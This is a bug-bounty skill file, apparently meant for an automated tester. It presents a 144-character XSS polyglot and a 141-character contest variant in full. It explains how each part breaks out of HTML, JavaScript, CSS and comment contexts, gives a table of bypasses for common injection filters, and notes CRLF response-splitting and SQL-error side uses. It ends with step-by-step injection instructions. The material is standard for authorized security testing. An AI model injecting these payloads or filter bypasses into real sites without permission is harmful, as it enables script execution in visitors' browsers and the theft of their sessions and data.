---
name: "xss-polyglot"
version: "2.0"
category: "injection"
subcategory: "polyglot"
phase: "exploitation"
tags: ["bug-bounty", "injection", "polyglot", "xss"]
tools: ["adb", "burp", "ghauri", "sqlmap"]
follow_up_skills: ["xss", "xss-waf-bypass", "dom-xss"]
prerequisite_skills: ["xss", "cross-site-scripting"]
description: "Bug bounty skill: xss polyglot - exploitation phase, injection category"
---
# Ultimate XSS Polyglot (144 chars)

## Summary

An XSS polyglot is a single payload that executes across multiple injection contexts without modification. The 144-character polyglot by Ahmed Elsobky covers 20+ HTML, JavaScript, CSS, and HTTP contexts, and also functions in error-based SQL injection and CRLF injection scenarios.

## The Polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

**Length**: 144 characters

## Anatomy

| Component | Purpose |
|-----------|---------|
| `jaVasCript:` | A label in ECMAScript; a URI scheme in HTML |
| `/*-/*`\`/*\\`\`/*'/*"/**/` | Multi-line comment in ECMAScript; literal-breaker sequence |
| `(/* */oNcliCk=alert() )` | Tangled execution zone wrapped in invoking parentheses |
| `//%0D%0A%0d%0a//` | Single-line comment in ECMAScript; double-CRLF in HTTP response headers |
| `</stYle/</titLe/</teXtarEa/</scRipt/--!>` | HTML-tag-breaker sequence (closes style, title, textarea, script, comments) |
| `\x3csVg/<sVg/oNloAd=alert()//>\x3e` | SVG element with `onload` event |

## Contexts Covered

### HTML Contexts

#### Double-Quoted Tag Attributes

```html
<input type="text" value="POLYGLOT"></input>
```

The polyglot breaks out of the attribute, closes the tag, and injects an SVG with `onload`.

#### Single-Quoted Tag Attributes

```html
<input type='text' value='POLYGLOT'></input>
```

The single quote in `/*'/*` closes the attribute string.

#### Unquoted Tag Attributes

```html
<input type=text value=POLYGLOT></input>
```

No quotes needed — the space after `alert() )` and `/` characters terminate the attribute.

#### HTML-Escaped Values (May Require Click)

```html
<img border=3 alt=POLYGLOT_ESC></img>
```

Uses `&#039;` and `&quot;` instead of raw quotes. The click may not be needed with `onload`-supporting elements.

#### href / xlink:href / src with HTML-Escaped Values

```html
<a href="POLYGLOT_ESC">click me</a>
<math xlink:href="POLYGLOT_ESC">click me</math>
<iframe src="POLYGLOT_ESC"></iframe>
```

#### HTML Comments

```html
<!-- POLYGLOT -->
```

The `--!>` breaks out of the comment, and `\x3e` closes it.

#### Arbitrary Common HTML Tags

Works inside `<title>`, `<style>`, `<textarea>`, `<div>`, and others. The `</stYle/</titLe/</teXtarEa/</scRipt/--!>` sequence closes whichever enclosing tag is open.

### Script Contexts

#### Double-Quoted Strings

```js
var str = "POLYGLOT";
```

The `"` inside `/*'/*"` closes the string. The rest is a multi-line comment or syntax error that doesn't prevent execution.

#### Single-Quoted Strings

```js
var str = 'POLYGLOT';
```

The `'` inside `/*'` closes the string.

#### Template Strings / Literals (ES6)

```js
String.raw`POLYGLOT`;
```

The backtick in `/*`\` closes the template literal.

#### Regular Expression Literals

```js
var re = /POLYGLOT/;
```

The `/` at the end after `>\x3e` terminates the regex if one was opened.

#### Single-Line and Multi-Line Comments

```js
// POLYGLOT
/* POLYGLOT */
```

The `//` and `/* */` patterns keep the parser happy.

### JS Sinks

Works with `eval()`, `setTimeout()`, `setInterval()`, and `Function()` when URL-encoded versions of the polyglot are passed via `location.hash` or `location.search`.

### Event Handlers with HTML-Escaped Values

```html
<svg onload="void 'POLYGLOT_ESC';"></svg>
```

### Filter Evasion

The polyglot is designed to bypass common `preg_replace` filters:

| Filter Pattern | Bypass |
|----------------|--------|
| `/\b(?:javascript:\|on\w+=)/` | Uses `jaVasCript:` (mixed case) and places `oNcliCk=` inside a comment |
| `/`/` → `` ` `` | `` /*`/*\` `` prevents backtick matching |
| `/<\/\w+>/` | `</stYle/` uses trailing `/` to prevent exact tag match |
| `/-->/` | `--!>` is not `-->` |
| `/<\w+\s+/` | `<sVg/` has no space after tag name |

### Bonus: CRLF-Based XSS

The `%0D%0A%0d%0a` injects CRLF sequences into HTTP response headers, enabling HTTP response splitting:

```
HTTP/1.1 200 OK
Set-Cookie: x=POLYGLOT
```

The CRLF terminates the header, and the HTML payload begins the body.

### Bonus: Error-Based SQL Injection

```
SELECT * FROM Users WHERE Username='POLYGLOT'
SELECT * FROM Users WHERE Username="POLYGLOT"
```

The single or double quote in the polyglot closes the SQL string, causing an error that may reveal the payload in the error message.

## Usage

1. Identify the injection context (HTML attribute, JS string, comment, etc.).
2. If the context HTML-encodes quotes, use the HTML-escaped variant (replace `'` with `&#039;`, `"` with `&quot;`, `<` with `&lt;`, `>` with `&gt;`).
3. If passing via URL to `eval()`/`setTimeout()`/`Function()`, URL-encode the polyglot.
4. Inject the polyglot. If an alert dialog appears, the context is covered.

## Tools

- **Auto_Wordlists polyglots**: https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
- **jsbin demos** (original author's test cases linked in references below)

## XSS Polyglot Challenge v2

Multi-context polyglot contest from XSS cheat sheet community. Judged on character count, context coverage, and character constraints.

### Context Definitions

| # | Context |
|---|---------|
| 1 | HTML entity |
| 2 | HTML no entity |
| 3 | HTML entity inside HTML without entity |
| 4 | HTML no entity inside HTML with entity |
| 5 | HTML entity inside SVG without entity |
| 6 | HTML no entity inside SVG with entity |
| 7 | HTML entity inside SVG inside HTML without entity |
| 8 | HTML no entity inside SVG inside HTML with entity |
| 9 | JS string single quote |
| 10 | JS string double quote |
| 11 | JS string backtick |
| 12 | JS script block with entity |
| 13 | JS script block without entity |
| 14 | JS eval |
| 15 | JS URL |
| 16 | CSS with entity |
| 17 | CSS without entity |
| 18 | HTML comment with entity |
| 19 | HTML comment without entity |
| 20 | URL |

### Top Performers (20 contexts, 141 chars)

```
jaVasCript:/*-'/*`\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</title/</style/</script/</textarea/</noscript/</noembed/</frameset/</xmp/--!>\x3csvg/<svg/oNload=alert()//>\x3e
```

**Author**: crlf  
**Length**: 141 characters  
**Contexts**: 20/20  
**Notes**: Avoids `%0a`, `%0d`, `\r`, `\n`, `\s`, `\t`, `\f`, digits, parentheses (except in `alert()`), `eval`, `fromCharCode`, `String`, single word characters, `input`, `button`, `textarea`, `select`, `option`, `optgroup`, `noscript`, `noembed`, `frameset`, `xmp`, and certain closing tags.

### Additional 20-Context Payloads

52 additional payloads covering all 20 contexts exist in the [full leaderboard](https://github.com/crlf/awesome-xss-polyglot-challenge-v2). Notable variants use:
- **CSS @import** technique for CSS contexts
- **JavaScript URL** variants via `javascript:` URI scheme  
- **Comment injection** patterns for HTML comment contexts
- **Style tag** based approaches for CSS context coverage

### Shorter Payloads (fewer contexts)

| Contexts | Length | Example Author |
|----------|--------|----------------|
| 19 | 115–137 | crlf (3 payloads) |
| 18 | 89–130 | crlf, lowlighter, polska (5 payloads) |
| 17 | 87–116 | 0xAE, crlf, xss (4 payloads) |
| 16 | 72–111 | 0xAE, crlf, mlb, polska (9 payloads) |
| 15 | 68–109 | multiple (10 payloads) |
| 14 | 58–115 | multiple (9 payloads) |
| 13 | 50–97 | multiple (11 payloads) |
| 12 | 49–95 | multiple (13 payloads) |
| 11 | 52–103 | multiple (8 payloads) |
| 10 | 55–82 | multiple (7 payloads) |
| 9 | 57–93 | multiple (6 payloads) |
| 8 | 53–73 | multiple (6 payloads) |
| 7 | 51–67 | multiple (5 payloads) |
| 6 | 42–62 | multiple (5 payloads) |
| 5 | 35–46 | multiple (6 payloads) |
| 4 | 33–42 | multiple (3 payloads) |
| 3 | 27–37 | multiple (5 payloads) |
| 2 | 18–25 | multiple (4 payloads) |

## References

- https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
- Demo index: https://jsbin.com/dopepi (double-quoted attribute)
- https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/xss_polyglots.txt
- https://github.com/crlf/awesome-xss-polyglot-challenge-v2 (full leaderboard)
